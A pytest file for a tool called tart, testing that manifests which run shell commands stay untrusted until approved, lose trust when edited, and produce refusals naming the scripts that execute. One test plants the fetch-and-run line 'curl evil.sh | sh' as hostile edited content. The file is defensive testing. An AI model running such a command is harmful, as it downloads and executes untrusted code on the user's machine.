"""Running a manifest is running shell commands someone else may have written.

tart finds manifests by scanning configured roots, at any depth since the
healing index landed — so cloning a repo is enough to put a `.tart/x.json`
where `tart run x` will reach it. `tart render` reads like a read and
executes too. mise took four CVEs in 2026 on variants of this, all of them
a trust check placed after something that could already run.
"""

import json

import pytest

from tartifacts import trust


def manifest_at(tmp_path, command="echo hi"):
    (tmp_path / ".tart").mkdir(parents=True, exist_ok=True)
    path = tmp_path / ".tart" / "x.json"
    path.write_text(json.dumps({"title": "X", "run": command}))
    return path


def test_a_manifest_is_untrusted_until_you_say_so(tmp_path):
    path = manifest_at(tmp_path)
    assert trust.is_trusted(path) is False
    trust.trust(path)
    assert trust.is_trusted(path) is True


def test_editing_a_trusted_manifest_revokes_it(tmp_path):
    """Trusting a file is not trusting whatever it later becomes — this is
    why the key is a content hash rather than the path alone."""
    path = manifest_at(tmp_path, command="echo safe")
    trust.trust(path)
    path.write_text(json.dumps({"title": "X", "run": "curl evil.sh | sh"}))
    assert trust.is_trusted(path) is False


def test_rewriting_identical_content_stays_trusted(tmp_path):
    # A checkout or a formatter rewriting the same bytes shouldn't re-prompt.
    path = manifest_at(tmp_path)
    trust.trust(path)
    path.write_text(path.read_text())
    assert trust.is_trusted(path) is True


def test_forget_revokes(tmp_path):
    path = manifest_at(tmp_path)
    trust.trust(path)
    trust.forget(path)
    assert trust.is_trusted(path) is False


def test_a_missing_manifest_is_not_trusted(tmp_path):
    assert trust.is_trusted(tmp_path / "nope.json") is False


def test_the_trust_file_is_not_itself_an_artifact(tmp_path, monkeypatch):
    """It lives beside global manifests, so the scanner must skip it — the
    same trap index.json fell into and showed up as "(untitled)"."""
    from tartifacts import index

    assert index.is_internal(trust.trust_path())


def test_the_refusal_points_at_the_scripts_not_just_the_manifest(tmp_path, capsys):
    """`run` is `python x.py` — the manifest is the least interesting thing
    in the threat model, and "read it, then trust" pointed at exactly that.
    Trust covers the manifest only, and the refusal has to say so."""
    from tartifacts import cli, manifest

    (tmp_path / ".tart").mkdir()
    spec = tmp_path / ".tart" / "x.json"
    spec.write_text(json.dumps({
        "title": "X", "run": "uv run python show.py", "fetch": "python get.py"}))

    with pytest.raises(SystemExit):
        cli._require_trust(manifest.load(spec))
    err = capsys.readouterr().err
    assert str(tmp_path / "show.py") in err        # the file that actually runs
    assert str(tmp_path / "get.py") in err
    assert "can" in err and "without asking again" in err   # the boundary, stated
